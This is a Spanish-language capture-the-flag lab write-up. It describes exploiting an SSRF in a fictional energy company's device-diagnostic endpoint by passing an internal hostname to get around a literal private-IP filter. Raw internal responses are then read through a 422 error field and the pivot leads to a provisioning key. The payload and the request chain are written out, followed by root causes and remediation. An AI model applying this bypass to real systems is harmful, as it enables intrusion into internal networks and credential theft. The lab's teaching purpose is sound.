# Laboratorio: Helios Energy — SSRF hacia red interna de medición

## Objetivo

Encontrar la clave de la estación principal que permite controlar toda la plataforma, a partir de la funcionalidad de "diagnóstico remoto de dispositivos" del portal público de Helios Energy.

## Descubrimiento 1 — `robots.txt` del portal público

Se solicitó directamente `GET /robots.txt` del sitio público:

```
User-agent: *
Allow: /internal-notes.txt
Disallow: /admin/
Disallow: /backup/
Disallow: /staging/

# Nota de Ops: el documento de notas de red quedó accesible por error.
# Ubicación: /internal-notes.txt
```

El propio archivo indicaba un documento filtrado por error: `/internal-notes.txt`.

## Descubrimiento 2 — notas internas de red

Al pedir `GET /internal-notes.txt`, se obtuvo un documento de topología de red interno que reveló:

- Existe un servicio interno llamado **`metering-core`**, puerto **9100**, resuelto por nombre dentro de la red de la planta, con endpoints habituales `/status`, `/health`, `/robots.txt`.
- El filtro de seguridad del "Diagnóstico remoto" **bloquea IPs privadas literales** (`10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`), pero **no valida a dónde resuelve un nombre de host** — es decir, filtra por el texto de la URL, no por la IP real de destino.
- Una nota de QA advertía que "el portal a veces consulta rutas internas no previstas", confirmando que el control de egress era insuficiente.

## Explotación — SSRF hacia `metering-core`

Usando el endpoint `POST /api/diagnostico` (el que respalda la función de diagnóstico remoto), se mandó como payload un nombre de host interno en lugar de una IP:

```json
{"url": "http://metering-core:9100/status"}
```

Esto **bypaseó el filtro de IPs privadas**, porque `metering-core` es un nombre de host, no una IP literal, aunque resuelva internamente a una IP privada a la que el atacante no tiene acceso directo.

### Detalle técnico clave: exfiltración vía mensajes de error

El backend del portal espera que el dispositivo consultado devuelva un JSON con campos específicos (`device_id`, `type`, `status`, `metrics`). Cuando la respuesta no cumple ese formato, el backend devuelve un error **422** — pero ese error incluye un campo `preview.body` con el **contenido crudo de la respuesta interna**, sin importar si es JSON válido o no. Esto permitió leer el contenido de cualquier endpoint interno alcanzado, sin necesidad de que la respuesta "cooperara" con el formato esperado por la aplicación.

### Cadena de pivoteo

1. `GET http://metering-core:9100/status` → `"metering-core: ok."` (confirma que el host existe y responde).
2. `GET http://metering-core:9100/health` → `{"ok":true}` (sin información adicional).
3. `GET http://metering-core:9100/` → `"Helios Metering Core - nodo interno. Acceso restringido."`
4. `GET http://metering-core:9100/robots.txt` → reveló una ruta no listada:
   ```
   User-agent: *
   Disallow: /internal/
   ```
5. `GET http://metering-core:9100/internal/` → **directory listing** habilitado, mostrando:
   ```
   telemetry-report.html
   ```
6. `GET http://metering-core:9100/internal/telemetry-report.html` → reporte de telemetría con un enlace directo:
   ```
   Credenciales de aprovisionamiento de estación: /internal/keys/station-key.json
   ```
7. `GET http://metering-core:9100/internal/keys/station-key.json` → respuesta JSON con la clave buscada:
   ```json
   {
     "flag": "7e3c9a1f05b84d62ae9f1c73d2680b4a",
     "notes": "Buen pivot! :) La clave de estacion no deberia ser alcanzable desde afuera.",
     "provisioning_key": "7e3c9a1f05b84d62ae9f1c73d2680b4a",
     "station": "HELIOS-CENTRAL-01"
   }
   ```

## Resultado

Se obtuvo la **`provisioning_key`** de la estación `HELIOS-CENTRAL-01`:

```
7e3c9a1f05b84d62ae9f1c73d2680b4a
```

## Causa raíz

- **SSRF sin restricción de destino suficiente:** la función de diagnóstico permite que el servidor consulte cualquier URL arbitraria, y el control de seguridad implementado solo bloquea **IPs privadas literales**, dejando pasar **nombres de host** que resuelven internamente a esos mismos rangos (bypass de filtro por resolución DNS).
- **Red interna sin segmentación efectiva desde la perspectiva del servidor del portal:** el portal público puede alcanzar servicios internos (`metering-core`) que se supone solo deberían ser accesibles desde la red de planta.
- **Exposición de información mediante mensajes de error:** el backend expone el contenido crudo de la respuesta de cualquier URL consultada a través del campo `preview.body`, incluso cuando la respuesta no es válida para el flujo normal de la aplicación. Esto convierte cualquier endpoint interno alcanzable en un oráculo de lectura de datos.
- **Falta de autenticación/autorización en `metering-core`:** el servicio interno no exige ninguna credencial para exponer `/internal/` (con directory listing habilitado) ni para servir `station-key.json`.
- **Exposición accidental de rutas vía `robots.txt`:** tanto en el portal público como en `metering-core`, el archivo `robots.txt` terminó funcionando como un mapa de rutas sensibles en vez de ocultarlas (ya que `Disallow` solo es una convención para crawlers, no un control de acceso).

## Recomendaciones de remediación

1. **Validar destinos de SSRF por allowlist, no por blocklist de IPs:** en vez de bloquear rangos de IP conocidos, resolver el hostname a IP **antes** de hacer la petición y validar esa IP resuelta contra una lista explícita de hosts/rangos permitidos (allowlist), rechazando cualquier otro destino, incluyendo rangos privados, loopback y metadata de nube.
2. **Segmentar la red de forma real:** el servidor del portal público no debería tener ruta de red hacia `metering-core` en absoluto, independientemente de los controles a nivel aplicación.
3. **No reenviar contenido crudo de respuestas de terceros al cliente** (eliminar o truncar agresivamente el campo `preview.body`, o no incluirlo en absoluto en mensajes de error).
4. **Autenticar y autorizar `metering-core`:** exigir credenciales (mTLS, token interno, etc.) para cualquier endpoint, y deshabilitar el directory listing en `/internal/`.
5. **No depender de `robots.txt` para ocultar rutas sensibles:** cualquier ruta que no deba ser pública no debe existir como archivo estático accesible; `robots.txt` es una convención para buscadores, no un control de seguridad.
6. **Rotar la clave de aprovisionamiento comprometida** (`station-key.json`) una vez identificada la fuga.

## Herramientas utilizadas

- Navegador (para `robots.txt` e `internal-notes.txt` del portal público).
- Burp Suite (Repeater) — para modificar el campo `url` del body JSON enviado a `/api/diagnostico` y pivotear hacia la red interna.
